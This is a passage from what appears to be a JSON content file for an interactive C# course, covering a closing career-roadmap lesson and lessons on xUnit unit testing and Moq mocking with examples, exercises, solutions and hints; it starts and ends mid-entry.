OAuth, Identity)\");\nConsole.WriteLine(\"  3. Performance Optimization (Caching, Profiling)\");\nConsole.WriteLine(\"  4. Design Patterns (Repository, Factory, Strategy)\");\nConsole.WriteLine(\"  5. Microservices (Docker, Kubernetes, Service Bus)\");\nConsole.WriteLine(\"  6. Real-time Features (SignalR)\");\nConsole.WriteLine(\"  7. Mobile Development (.NET MAUI)\");\nConsole.WriteLine(\"  8. Advanced EF Core (Raw SQL, Global Filters, Interceptors)\\n\");\n\nConsole.WriteLine(\"💡 PROJECTS TO BUILD:\");\nConsole.WriteLine(\"  1. E-Commerce Platform\");\nConsole.WriteLine(\"     - Product catalog, shopping cart, payment\");\nConsole.WriteLine(\"     - Blazor frontend, API backend, SQL database\");\nConsole.WriteLine(\"     - Deploy to Azure\");\nConsole.WriteLine(\"\\n  2. Real-Time Chat Application\");\nConsole.WriteLine(\"     - SignalR for real-time messages\");\nConsole.WriteLine(\"     - User authentication\");\nConsole.WriteLine(\"     - Message history with EF Core\");\nConsole.WriteLine(\"\\n  3. Task Management System (like Jira)\");\nConsole.WriteLine(\"     - Boards, lists, cards\");\nConsole.WriteLine(\"     - Drag-and-drop (Blazor)\");\nConsole.WriteLine(\"     - Team collaboration features\\n\");\n\nConsole.WriteLine(\"📖 LEARNING RESOURCES:\");\nConsole.WriteLine(\"\\n  Microsoft Learn (FREE!):\");\nConsole.WriteLine(\"  - learn.microsoft.com/training\");\nConsole.WriteLine(\"  - Paths: ASP.NET Core, Blazor, Azure\");\nConsole.WriteLine(\"\\n  YouTube Channels:\");\nConsole.WriteLine(\"  - IAmTimCorey (C# fundamentals & best practices)\");\nConsole.WriteLine(\"  - Nick Chapsas (Advanced C# & performance)\");\nConsole.WriteLine(\"  - dotnet (Official Microsoft channel)\");\nConsole.WriteLine(\"\\n  Books:\");\nConsole.WriteLine(\"  - 'C# 12 and .NET 8' by Mark J. Price\");\nConsole.WriteLine(\"  - 'Clean Code' by Robert C. Martin\");\nConsole.WriteLine(\"  - 'Designing Data-Intensive Applications' by Martin Kleppmann\");\nConsole.WriteLine(\"\\n  Communities:\");\nConsole.WriteLine(\"  - r/dotnet on Reddit\");\nConsole.WriteLine(\"  - .NET Discord Server\");\nConsole.WriteLine(\"  - Stack Overflow (ask & answer!)\");\nConsole.WriteLine(\"  - Twitter/X: #dotnet, #csharp\\n\");\n\nConsole.WriteLine(\"🎯 30-DAY ACTION PLAN:\");\nConsole.WriteLine(\"  Week 1: Build simple CRUD API with tests\");\nConsole.WriteLine(\"  Week 2: Add JWT authentication\");\nConsole.WriteLine(\"  Week 3: Create Blazor frontend\");\nConsole.WriteLine(\"  Week 4: Deploy to Azure, add CI/CD\\n\");\n\nConsole.WriteLine(\"🚀 90-DAY GOALS:\");\nConsole.WriteLine(\"  - Complete 1 major project\");\nConsole.WriteLine(\"  - Contribute to 1 open-source project\");\nConsole.WriteLine(\"  - Answer 10 Stack Overflow questions\");\nConsole.WriteLine(\"  - Learn 1 advanced topic deeply\");\nConsole.WriteLine(\"  - Blog about your learning\\n\");\n\nConsole.WriteLine(\"🌟 1-YEAR VISION:\");\nConsole.WriteLine(\"  - Portfolio with 3+ impressive projects\");\nConsole.WriteLine(\"  - Microsoft certification (AZ-204 or similar)\");\nConsole.WriteLine(\"  - Active in developer community\");\nConsole.WriteLine(\"  - Confident applying for .NET developer roles\");\nConsole.WriteLine(\"  - Mentoring other beginners\\n\");\n\nConsole.WriteLine(\"═══════════════════════════════════════════\");\nConsole.WriteLine(\"  FINAL WORDS\");\nConsole.WriteLine(\"═══════════════════════════════════════════\\n\");\nConsole.WriteLine(\"You've come from absolute beginner to full-stack developer.\");\nConsole.WriteLine(\"That's an incredible achievement!\");\nConsole.WriteLine(\"\\nRemember:\");\nConsole.WriteLine(\"  ✓ Learning is a journey, not a destination\");\nConsole.WriteLine(\"  ✓ Build projects - they're your best teacher\");\nConsole.WriteLine(\"  ✓ Share your knowledge - teaching solidifies learning\");\nConsole.WriteLine(\"  ✓ Don't compare your chapter 1 to someone's chapter 20\");\nConsole.WriteLine(\"  ✓ The developer community is welcoming - ask questions!\");\nConsole.WriteLine(\"\\nThe C# and .NET ecosystem is vast and exciting.\");\nConsole.WriteLine(\"You now have the foundation to explore any direction.\");\nConsole.WriteLine(\"\\nKeep coding, keep learning, keep building.\");\nConsole.WriteLine(\"\\n🎉 CONGRATULATIONS ON COMPLETING THE COURSE! 🎉\");\nConsole.WriteLine(\"\\nNow go build something amazing! 🚀\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"ROADMAP\"",
                  "expectedOutput": "ROADMAP",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"MASTERED\"",
                  "expectedOutput": "MASTERED",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"PROJECTS\"",
                  "expectedOutput": "PROJECTS",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Output should contain \"RESOURCES\"",
                  "expectedOutput": "RESOURCES",
                  "isVisible": true
                },
                {
                  "id": "test-5",
                  "description": "Output should contain \"GOALS\"",
                  "expectedOutput": "GOALS",
                  "isVisible": true
                },
                {
                  "id": "test-6",
                  "description": "Output should contain \"CONGRATULATIONS\"",
                  "expectedOutput": "CONGRATULATIONS",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Reflect on journey. Plan next steps. Set goals (30/90/365 days). List resources. Choose projects. Join community. Keep learning!"
                },
                {
                  "level": 2,
                  "text": "Tutorial hell: Don't just watch tutorials! BUILD projects. Learning-by-doing is 10x more effective. Stop watching, start coding!"
                },
                {
                  "level": 3,
                  "text": "Imposter syndrome: Every developer feels this! Even experts. It's normal. Keep building, you know more than you think!"
                },
                {
                  "level": 4,
                  "text": "Analysis paralysis: Don't endlessly research 'best practices'. Start building, refactor later. Progress > Perfection."
                },
                {
                  "level": 5,
                  "text": "Isolated learning: Join communities! Pair programming, code reviews, discussions teach more than solo study. Connect with other developers!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Tutorial hell",
                  "consequence": "Don't just watch tutorials! BUILD projects. Learning-by-doing is 10x more effective. Stop watching, start coding!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Imposter syndrome",
                  "consequence": "Every developer feels this! Even experts. It's normal. Keep building, you know more than you think!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Analysis paralysis",
                  "consequence": "Don't endlessly research 'best practices'. Start building, refactor later. Progress > Perfection.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Isolated learning",
                  "consequence": "Join communities! Pair programming, code reviews, discussions teach more than solo study. Connect with other developers!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        }
      ]
    },
    {
      "id": "module-15",
      "title": "Unit Testing with xUnit",
      "description": "Master unit testing fundamentals with xUnit, mocking dependencies with Moq/NSubstitute, and integration testing patterns for robust, maintainable code.",
      "difficulty": "intermediate",
      "estimatedHours": 2,
      "lessons": [
        {
          "id": "lesson-15-01",
          "title": "xUnit Testing Fundamentals (The Quality Check)",
          "moduleId": "module-15",
          "order": 1,
          "estimatedMinutes": 20,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine you're a chef. Before serving a dish to customers, you TASTE it first!\n\nThat's what UNIT TESTING is:\n• UNIT = One small piece of code (a method, a class)\n• TEST = Code that checks if that piece works correctly\n• xUnit = Popular testing framework for .NET\n\nWhy test?\n• Find bugs BEFORE users do\n• Refactor safely - tests catch breaking changes\n• Document behavior - tests show how code should work\n• Confidence - deploy knowing things work!\n\nANATOMY OF A TEST (AAA Pattern):\n1. ARRANGE - Set up test data and conditions\n2. ACT - Call the method being tested\n3. ASSERT - Verify the result is correct\n\nThink: 'Unit tests are automated quality checks that run in milliseconds!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// STEP 1: Install xUnit packages\n// dotnet add package xunit\n// dotnet add package xunit.runner.visualstudio\n// dotnet add package Microsoft.NET.Test.Sdk\n\nusing Xunit;\n\n// ===== THE CODE TO TEST =====\npublic class Calculator\n{\n    public int Add(int a, int b) => a + b;\n    public int Subtract(int a, int b) => a - b;\n    public int Divide(int a, int b)\n    {\n        if (b == 0) throw new DivideByZeroException();\n        return a / b;\n    }\n}\n\n// ===== THE TESTS =====\npublic class CalculatorTests\n{\n    // [Fact] = A single test case\n    [Fact]\n    public void Add_TwoPositiveNumbers_ReturnsSum()\n    {\n        // ARRANGE\n        var calculator = new Calculator();\n        \n        // ACT\n        int result = calculator.Add(3, 5);\n        \n        // ASSERT\n        Assert.Equal(8, result);\n    }\n    \n    [Fact]\n    public void Add_NegativeNumbers_ReturnsCorrectSum()\n    {\n        var calculator = new Calculator();\n        Assert.Equal(-8, calculator.Add(-3, -5));\n    }\n    \n    // [Theory] + [InlineData] = Parameterized tests\n    [Theory]\n    [InlineData(10, 5, 5)]\n    [InlineData(100, 25, 75)]\n    [InlineData(0, 0, 0)]\n    public void Subtract_VariousInputs_ReturnsCorrectDifference(\n        int a, int b, int expected)\n    {\n        var calculator = new Calculator();\n        Assert.Equal(expected, calculator.Subtract(a, b));\n    }\n    \n    // Testing exceptions\n    [Fact]\n    public void Divide_ByZero_ThrowsException()\n    {\n        var calculator = new Calculator();\n        \n        // Assert.Throws checks that an exception is thrown\n        Assert.Throws<DivideByZeroException>(\n            () => calculator.Divide(10, 0)\n        );\n    }\n}\n\n// ===== COMMON ASSERTIONS (xUnit 2.9+) =====\n// Assert.Equal(expected, actual)      - Values match\n// Assert.NotEqual(expected, actual)   - Values don't match\n// Assert.True(condition)              - Condition is true\n// Assert.False(condition)             - Condition is false\n// Assert.Null(object)                 - Object is null\n// Assert.NotNull(object)              - Object is not null\n// Assert.Throws<T>(() => code)        - Code throws exception\n// Assert.ThrowsAsync<T>(async () => ) - Async exception test\n// Assert.Contains(item, collection)   - Collection contains item\n// Assert.Empty(collection)            - Collection is empty\n// Assert.Single(collection)           - Collection has exactly one item\n// Assert.All(collection, predicate)   - All items match predicate\n// Assert.Equivalent(expected, actual) - Deep object comparison (xUnit 2.5+)\n// Assert.Multiple(() => {}, () => {}) - Run multiple asserts, report all failures\n\n// Run tests: dotnet test\nConsole.WriteLine(\"Run tests with: dotnet test\");",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`[Fact]`**: Marks a method as a test. Method must be public, void (or Task for async), with no parameters. xUnit discovers and runs all [Fact] methods.\n\n**`[Theory] + [InlineData]`**: Parameterized tests! Run the same test with different inputs. Each [InlineData] creates a separate test case. Great for testing multiple scenarios efficiently.\n\n**`Assert.Equal(expected, actual)`**: Core assertion. IMPORTANT: expected comes FIRST! 'Assert.Equal(5, result)' not 'Assert.Equal(result, 5)'. Wrong order = confusing failure messages.\n\n**`Assert.Throws<TException>(() => code)`**: Verifies that code throws a specific exception. If no exception or wrong type, test fails. Use lambda to wrap the throwing code.\n\n**`Test naming: Method_Scenario_Expected`**: Convention: 'Add_TwoPositiveNumbers_ReturnsSum'. Clear names document behavior and make failures obvious."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Issues!\n\n**Test Isolation Failure**: Tests that share state (static fields, singletons) cause flaky results. Each test must be independent - create fresh instances in each test method.\n\n**Assert.Equal with Floating Point**: `Assert.Equal(0.1 + 0.2, 0.3)` FAILS due to floating-point precision! Use `Assert.Equal(expected, actual, precision)` for decimals/doubles.\n\n**Async Tests Without Task Return**: `async void` tests appear to pass even when they fail! Always use `async Task` for async tests, never `async void`.\n\n**Theory Without Enough Test Cases**: One [InlineData] doesn't prove correctness. Include edge cases: zero, negative, max values, null, empty strings.\n\n**xUnit v3 Migration Note**: xUnit v3 introduces `TheoryDataRow<T>` for strongly-typed theory data and `Assert.Equivalent` for deep object comparison. When upgrading, review new assertion options."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-15-01-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create unit tests for a StringHelper class!\n\n1. Create a StringHelper class with methods:\n   - Reverse(string s) - Reverses a string\n   - IsPalindrome(string s) - True if string reads same forwards/backwards\n   - CountWords(string s) - Counts words separated by spaces\n\n2. Write tests for each method:\n   - Test Reverse with normal string\n   - Test IsPalindrome with 'racecar' (true) and 'hello' (false)\n   - Test CountWords with 'hello world' (2 words)\n   - Test edge case: empty string\n\nUse [Fact] for single tests, [Theory] for multiple inputs!",
              "starterCode": "using Xunit;\n\npublic class StringHelper\n{\n    public string Reverse(string s)\n    {\n        // Implement: reverse the string\n        return new string(s.Reverse().ToArray());\n    }\n    \n    public bool IsPalindrome(string s)\n    {\n        // Implement: check if palindrome\n        return s == Reverse(s);\n    }\n    \n    public int CountWords(string s)\n    {\n        // Implement: count words\n        if (string.IsNullOrWhiteSpace(s)) return 0;\n        return s.Split(' ', StringSplitOptions.RemoveEmptyEntries).Length;\n    }\n}\n\npublic class StringHelperTests\n{\n    [Fact]\n    public void Reverse_NormalString_ReversesCorrectly()\n    {\n        // Arrange\n        var helper = new StringHelper();\n        \n        // Act\n        string result = helper.Reverse(\"hello\");\n        \n        // Assert\n        Assert.Equal(/* expected */, result);\n    }\n    \n    [Theory]\n    [InlineData(\"racecar\", true)]\n    [InlineData(\"hello\", false)]\n    public void IsPalindrome_VariousInputs_ReturnsCorrectResult(\n        string input, bool expected)\n    {\n        // Write test\n    }\n    \n    // Add more tests for CountWords and edge cases!\n}",
              "solution": "using Xunit;\n\npublic class StringHelper\n{\n    public string Reverse(string s)\n    {\n        return new string(s.Reverse().ToArray());\n    }\n    \n    public bool IsPalindrome(string s)\n    {\n        return s.ToLower() == Reverse(s.ToLower());\n    }\n    \n    public int CountWords(string s)\n    {\n        if (string.IsNullOrWhiteSpace(s)) return 0;\n        return s.Split(' ', StringSplitOptions.RemoveEmptyEntries).Length;\n    }\n}\n\npublic class StringHelperTests\n{\n    [Fact]\n    public void Reverse_NormalString_ReversesCorrectly()\n    {\n        var helper = new StringHelper();\n        string result = helper.Reverse(\"hello\");\n        Assert.Equal(\"olleh\", result);\n    }\n    \n    [Theory]\n    [InlineData(\"racecar\", true)]\n    [InlineData(\"hello\", false)]\n    [InlineData(\"Racecar\", true)]\n    public void IsPalindrome_VariousInputs_ReturnsCorrectResult(\n        string input, bool expected)\n    {\n        var helper = new StringHelper();\n        Assert.Equal(expected, helper.IsPalindrome(input));\n    }\n    \n    [Theory]\n    [InlineData(\"hello world\", 2)]\n    [InlineData(\"one\", 1)]\n    [InlineData(\"a b c d e\", 5)]\n    public void CountWords_VariousInputs_ReturnsCorrectCount(\n        string input, int expected)\n    {\n        var helper = new StringHelper();\n        Assert.Equal(expected, helper.CountWords(input));\n    }\n    \n    [Fact]\n    public void CountWords_EmptyString_ReturnsZero()\n    {\n        var helper = new StringHelper();\n        Assert.Equal(0, helper.CountWords(\"\"));\n    }\n    \n    [Fact]\n    public void Reverse_EmptyString_ReturnsEmpty()\n    {\n        var helper = new StringHelper();\n        Assert.Equal(\"\", helper.Reverse(\"\"));\n    }\n}\n\nConsole.WriteLine(\"Tests defined! Run with: dotnet test\");\nConsole.WriteLine(\"Test: Reverse('hello') = 'olleh'\");\nConsole.WriteLine(\"Test: IsPalindrome('racecar') = true\");\nConsole.WriteLine(\"Test: CountWords('hello world') = 2\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain test definition",
                  "expectedOutput": "Test",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should show Reverse test",
                  "expectedOutput": "Reverse",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "AAA Pattern: Arrange (setup), Act (call method), Assert (verify). Every test follows this structure!"
                },
                {
                  "level": 2,
                  "text": "[Fact] for single test cases. [Theory] with [InlineData] for multiple inputs testing same logic."
                },
                {
                  "level": 3,
                  "text": "Assert.Equal(expected, actual): EXPECTED FIRST! Common mistake is reversing the order."
                },
                {
                  "level": 4,
                  "text": "Edge cases matter! Test empty strings, nulls, single characters. These often reveal bugs."
                },
                {
                  "level": 5,
                  "text": "Test naming: Method_Scenario_Expected. Example: 'CountWords_EmptyString_ReturnsZero'."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Wrong Assert.Equal order",
                  "consequence": "Assert.Equal(actual, expected) produces confusing failure messages! 'Expected: [your result], Actual: [what you expected]'. Always put expected FIRST.",
                  "correction": "Use Assert.Equal(expected, actual). Think: 'I expect THIS, and the actual result is THAT'."
                },
                {
                  "mistake": "Not testing edge cases",
                  "consequence": "Code works for 'hello' but crashes on empty string or null! Real apps receive unexpected inputs. Edge cases reveal bugs.",
                  "correction": "Always test: empty string, null, single element, very large inputs, negative numbers, boundary values."
                },
                {
                  "mistake": "Testing implementation instead of behavior",
                  "consequence": "Tests break when you refactor! If you test 'list has 3 items after calling private method X', refactoring X breaks tests. Test PUBLIC behavior.",
                  "correction": "Test WHAT code does, not HOW it does it. Test inputs and outputs, not internal implementation details."
                },
                {
                  "mistake": "Multiple asserts per test (without good reason)",
                  "consequence": "First failure stops the test! Other assertions never run. Hard to know full scope of failure.",
                  "correction": "Prefer one logical assertion per test. Multiple asserts OK if testing one cohesive thing (like all properties of returned object)."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "lesson-15-02",
          "title": "Mocking Dependencies (Fake Collaborators)",
          "moduleId": "module-15",
          "order": 2,
          "estimatedMinutes": 20,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine testing a car's engine. You don't need the ACTUAL wheels, fuel tank, and exhaust - you just need to verify the engine works!\n\nSame with code:\n• Your class (Engine) depends on other classes (Database, EmailService, PaymentAPI)\n• In tests, you don't want REAL database calls or emails sent!\n• Use MOCKS - fake versions that simulate dependencies\n\nMOCKING FRAMEWORKS:\n• Moq - Most popular, fluent API, Setup().Returns()\n• NSubstitute - Clean syntax, Substitute.For<T>()\n• FakeItEasy - Easy to read, A.Fake<T>()\n\nWHY MOCK?\n• Isolate unit under test\n• Control dependency behavior\n• Avoid side effects (real DB, emails, payments)\n• Test edge cases (simulate errors, timeouts)\n• Fast tests (no network/disk I/O)\n\nThink: 'Mocks are stunt doubles - they look like the real thing but are safe for testing!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// Install: dotnet add package Moq\nusing Moq;\nusing Xunit;\n\n// ===== INTERFACES (Dependencies) =====\npublic interface IEmailService\n{\n    bool SendEmail(string to, string subject, string body);\n}\n\npublic interface IUserRepository\n{\n    User GetById(int id);\n    void Save(User user);\n}\n\npublic class User\n{\n    public int Id { get; set; }\n    public string Email { get; set; }\n    public bool IsVerified { get; set; }\n}\n\n// ===== CLASS UNDER TEST =====\npublic class UserService\n{\n    private readonly IUserRepository _repo;\n    private readonly IEmailService _email;\n    \n    public UserService(IUserRepository repo, IEmailService email)\n    {\n        _repo = repo;\n        _email = email;\n    }\n    \n    public bool VerifyUser(int userId)\n    {\n        var user = _repo.GetById(userId);\n        if (user == null) return false;\n        \n        user.IsVerified = true;\n        _repo.Save(user);\n        _email.SendEmail(user.Email, \"Verified!\", \"Your account is verified.\");\n        \n        return true;\n    }\n}\n\n// ===== TESTS WITH MOCKS =====\npublic class UserServiceTests\n{\n    [Fact]\n    public void VerifyUser_ValidUser_SetsVerifiedAndSendsEmail()\n    {\n        // ARRANGE - Create mocks\n        var mockRepo = new Mock<IUserRepository>();\n        var mockEmail = new Mock<IEmailService>();\n        \n        var testUser = new User { Id = 1, Email = \"test@test.com\" };\n        \n        // Setup mock behavior\n        mockRepo.Setup(r => r.GetById(1)).Returns(testUser);\n        mockEmail.Setup(e => e.SendEmail(\n            It.IsAny<string>(),\n            It.IsAny<string>(),\n            It.IsAny<string>()\n        )).Returns(true);\n        \n        // Create service with mocks\n        var service = new UserService(mockRepo.Object, mockEmail.Object);\n        \n        // ACT\n        bool result = service.VerifyUser(1);\n        \n        // ASSERT\n        Assert.True(result);\n        Assert.True(testUser.IsVerified);  // User was modified\n        \n        // Verify mock was called correctly\n        mockRepo.Verify(r => r.Save(testUser), Times.Once);\n        mockEmail.Verify(e => e.SendEmail(\n            \"test@test.com\",\n            \"Verified!\",\n            It.IsAny<string>()\n        ), Times.Once);\n    }\n    \n    [Fact]\n    public void VerifyUser_UserNotFound_ReturnsFalse()\n    {\n        var mockRepo = new Mock<IUserRepository>();\n        var mockEmail = new Mock<IEmailService>();\n        \n        // Setup: GetById returns null\n        mockRepo.Setup(r => r.GetById(999)).Returns((User)null);\n        \n        var service = new UserService(mockRepo.Object, mockEmail.Object);\n        \n        bool result = service.VerifyUser(999);\n        \n        Assert.False(result);\n        // Verify Save was NEVER called\n        mockRepo.Verify(r => r.Save(It.IsAny<User>()), Times.Never);\n    }\n}\n\nConsole.WriteLine(\"Mock examples defined!\");\nConsole.WriteLine(\"Key Moq methods:\");\nConsole.WriteLine(\"  mock.Setup(x => x.Method()).Returns(value)\");\nConsole.WriteLine(\"  mock.Verify(x => x.Method(), Times.Once)\");\nConsole.WriteLine(\"  mock.Object - get the mocked instance\");",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`new Mock<IInterface>()`**: Creates a mock object that implements the interface. All methods return default values unless you Setup() them.\n\n**`mock.Setup(x => x.Method(params)).Returns(value)`**: Configure what the mock returns when a method is called. Use It.IsAny<T>() for 'any argument of type T'.\n\n**`mock.Object`**: Gets the actual mock instance to inject into your class. This is what you pass to constructors.\n\n**`mock.Verify(x => x.Method(), Times.Once)`**: Verify that a method was called. Times options: Once, Never, Exactly(n), AtLeast(n), AtMost(n). Fails if condition not met.\n\n**`It.IsAny<T>()`**: Match any argument of type T. Use in Setup or Verify. Example: 'It.IsAny<string>()' matches any string.\n\n**`It.Is<T>(predicate)`**: Match arguments that satisfy a condition. Example: 'It.Is<int>(x => x > 0)' matches positive integers."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Issues!\n\n**Moq Strict vs Loose Mode**: Default is Loose (unsetup methods return defaults). `new Mock<T>(MockBehavior.Strict)` throws on unconfigured calls - useful for catching missing setups but requires more work.\n\n**NSubstitute Alternative**: Consider NSubstitute for cleaner syntax: `var mock = Substitute.For<IService>(); mock.Method().Returns(value);` - no .Object needed, more readable.\n\n**Mocking Concrete Classes**: Moq can only mock virtual methods on classes. Prefer interfaces for dependencies. If you must mock classes, ensure methods are virtual.\n\n**Callback vs Returns for Side Effects**: Use `.Callback()` when you need to capture arguments or perform side effects: `mock.Setup(x => x.Save(It.IsAny<User>())).Callback<User>(u => savedUser = u);`\n\n**Async Method Mocking**: For async methods, use `.ReturnsAsync(value)` not `.Returns(Task.FromResult(value))`. The async helper is cleaner and handles edge cases better."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-15-02-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create tests with mocks for an OrderService!\n\n1. Define interfaces:\n   - IInventoryService: bool CheckStock(string productId, int quantity)\n   - IPaymentService: bool ProcessPayment(decimal amount)\n\n2. Create OrderService class:\n   - Constructor takes IInventoryService and IPaymentService\n   - Method: PlaceOrder(string productId, int quantity, decimal price)\n   - Returns true if stock available AND payment succeeds\n   - Returns false if no stock OR payment fails\n\n3. Write tests using Moq:\n   - Test successful order (stock OK, payment OK)\n   - Test failed order (no stock)\n   - Test failed order (payment fails)\n   - Verify each service was called correctly\n\nUse Setup(), Returns(), Verify()!",
              "starterCode": "using Moq;\nusing Xunit;\n\npublic interface IInventoryService\n{\n    bool CheckStock(string productId, int quantity);\n}\n\npublic interface IPaymentService\n{\n    bool ProcessPayment(decimal amount);\n}\n\npublic class OrderService\n{\n    private readonly IInventoryService _inventory;\n    private readonly IPaymentService _payment;\n    \n    public OrderService(IInventoryService inventory, IPaymentService payment)\n    {\n        _inventory = inventory;\n        _payment = payment;\n    }\n    \n    public bool PlaceOrder(string productId, int quantity, decimal price)\n    {\n        // Implement: check stock, then process payment\n        // Return true only if BOTH succeed\n        return false; // TODO\n    }\n}\n\npublic class OrderServiceTests\n{\n    [Fact]\n    public void PlaceOrder_StockAvailablePaymentSucceeds_ReturnsTrue()\n    {\n        // Arrange - create mocks\n        var mockInventory = new Mock<IInventoryService>();\n        var mockPayment = new Mock<IPaymentService>();\n        \n        // Setup mock behavior\n        mockInventory.Setup(i => i.CheckStock(\"PROD1\", 2)).Returns(true);\n        // Setup payment mock...\n        \n        var service = new OrderService(mockInventory.Object, mockPayment.Object);\n        \n        // Act\n        bool result = service.PlaceOrder(\"PROD1\", 2, 99.99m);\n        \n        // Assert\n        Assert.True(result);\n        // Verify both services were called...\n    }\n    \n    // Add more tests for failure cases!\n}",
              "solution": "using Moq;\nusing Xunit;\n\npublic interface IInventoryService\n{\n    bool CheckStock(string productId, int quantity);\n}\n\npublic interface IPaymentService\n{\n    bool ProcessPayment(decimal amount);\n}\n\npublic class OrderService\n{\n    private readonly IInventoryService _inventory;\n    private readonly IPaymentService _payment;\n    \n    public OrderService(IInventoryService inventory, IPaymentService payment)\n    {\n        _inventory = inventory;\n        _payment = payment;\n    }\n    \n    public bool PlaceOrder(string productId, int quantity, decimal price)\n    {\n        if (!_inventory.CheckStock(productId, quantity))\n            return false;\n        \n        return _payment.ProcessPayment(price * quantity);\n    }\n}\n\npublic class OrderServiceTests\n{\n    [Fact]\n    public void PlaceOrder_StockAvailablePaymentSucceeds_ReturnsTrue()\n    {\n        var mockInventory = new Mock<IInventoryService>();\n        var mockPayment = new Mock<IPaymentService>();\n        \n        mockInventory.Setup(i => i.CheckStock(\"PROD1\", 2)).Returns(true);\n        mockPayment.Setup(p => p.ProcessPayment(199.98m)).Returns(true);\n        \n        var service = new OrderService(mockInventory.Object, mockPayment.Object);\n        \n        bool result = service.PlaceOrder(\"PROD1\", 2, 99.99m);\n        \n        Assert.True(result);\n        mockInventory.Verify(i => i.CheckStock(\"PROD1\", 2), Times.Once);\n        mockPayment.Verify(p => p.ProcessPayment(199.98m), Times.Once);\n    }\n    \n    [Fact]\n    public void PlaceOrder_NoStock_ReturnsFalse()\n    {\n        var mockInventory = new Mock<IInventoryService>();\n        var mockPayment = new Mock<IPaymentService>();\n        \n        mockInventory.Setup(i => i.CheckStock(It.IsAny<string>(), It.IsAny<int>())).Returns(false);\n        \n        var service = new OrderService(mockInventory.Object, mockPayment.Object);\n        \n        bool result = service.PlaceOrder(\"PROD1\", 100, 99.99m);\n        \n        Assert.False(result);\n        mockPayment.Verify(p => p.ProcessPayment(It.IsAny<decimal>()), Times.Never);\n    }\n    \n    [Fact]\n    public void PlaceOrder_PaymentFails_ReturnsFalse()\n    {\n        var mockInventory = new Mock<IInventoryService>();\n        var mockPayment = new Mock<IPaymentService>();\n        \n        mockInventory.Setup(i => i.CheckStock(\"PROD1\", 1)).Returns(true);\n        mockPayment.Setup(p => p.ProcessPayment(It.IsAny<decimal>())).Returns(false);\n        \n        var service = new OrderService(mockInventory.Object, mockPayment.Object);\n        \n        bool result = service.PlaceOrder(\"PROD1\", 1, 50m);\n        \n        Assert.False(result);\n    }\n}\n\nConsole.WriteLine(\"OrderService tests with mocks defined!\");\nConsole.WriteLine(\"Tests cover: success, no stock, payment failure\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain test definitions",
                  "expectedOutput": "OrderService",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should mention mocks",
                  "expectedOutput": "mock",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Create mock: 'var mock = new Mock<IInterface>()'. Get instance: 'mock.Object'."
                },
                {
                  "level": 2,
                  "text": "Setup returns: 'mock.Setup(x => x.Method(args)).Returns(value)'. Use It.IsAny<T>() for any argument."
                },
                {
                  "level": 3,
                  "text": "Verify calls: 'mock.Verify(x => x.Method(args), Times.Once)'. Use Times.Never to verify NOT called."
                },
                {
                  "level": 4,
                  "text": "Test failure paths too! When stock fails, payment should NOT be called (Times.Never)."
                },
                {
                  "level": 5,
                  "text": "It.Is<T>(predicate) for conditional matching: 'It.Is<decimal>(x => x > 0)' matches positive decimals."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting mock.Object",
                  "consequence": "Passing 'mock' instead of 'mock.Object' to constructor! Mock<T> is the wrapper, .Object is the actual instance that implements T.",
                  "correction": "Always use mock.Object when injecting: 'new Service(mock.Object)' not 'new Service(mock)'."
                },
                {
                  "mistake": "Over-mocking",
                  "consequence": "Mocking everything including simple classes! Mocks add complexity. Only mock: external services, I/O, slow operations, things with side effects.",
                  "correction": "Don't mock simple value objects or classes with no dependencies. Only mock interfaces/abstractions for external concerns."
                },
                {
                  "mistake": "Setup without matching arguments",
                  "consequence": "Setup(x => x.Method(5)).Returns(true) but calling Method(10)! The mock returns default (false), test fails mysteriously.",
                  "correction": "Ensure Setup arguments match what code actually passes. Use It.IsAny<T>() when argument doesn't matter."
                },
                {
                  "mistake": "Not verifying important calls",
                  "consequence": "Test passes but critical method was never called! Setup returns values but Verify confirms calls actually happened.",
